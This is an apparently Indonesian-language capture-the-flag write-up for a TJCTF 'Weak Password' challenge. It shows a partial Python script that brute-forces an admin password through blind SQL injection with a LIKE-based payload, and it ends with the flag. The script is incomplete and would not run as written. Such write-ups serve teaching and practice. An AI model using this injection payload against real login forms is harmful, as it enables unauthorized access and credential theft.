## Weak Password, 50 ##

Soal : 

`It seems your login bypass skills are now famous! One of my friends has given you a challenge: figure out his password on this site. He's told me that his username is admin, and that his password is made of up only lowercase letters and numbers. (Wrap the password with tjctf{...})`

[Site](http://weak_password.tjctf.org)

Jika melakukan SQL injection, kita berhasil login, tetapi tidak ada apa apa di halaman login, karena yang kita butuhkan adalah passwordnya.

Maka satu satunya jalan adalah melakukan bruteforce. Kita tau dari soal kalau password hanya berupa lowercase dan number. Kita bisa buat script seperti ini :

```py
pass = ""
a = None
while True:
    if a == pass:
        break
    a = str(pass)

    for i in char:
        data = {
            "username":"admin' AND password LIKE '{}%';-- ".format(pass+i),
            "password":""
        }
 ```
 Kita gunakan `LIKE` disini untuk mengecek per sequence apakah password di urutan itu adalah huruf itu. 
 
 Flag : `tjctf{blindsqli14519}`
